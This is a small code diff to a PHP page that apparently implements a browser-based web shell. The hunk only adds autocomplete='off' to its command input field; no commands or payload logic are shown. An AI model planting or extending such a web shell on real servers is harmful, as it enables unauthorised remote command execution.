@@ -453,7 +453,7 @@ if (isset($_GET["feature"])) {
             <div id="shell-input">
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                 <div>
-                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    <input id="shell-cmd" autocomplete="off" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                 </div>
             </div>
         </div>
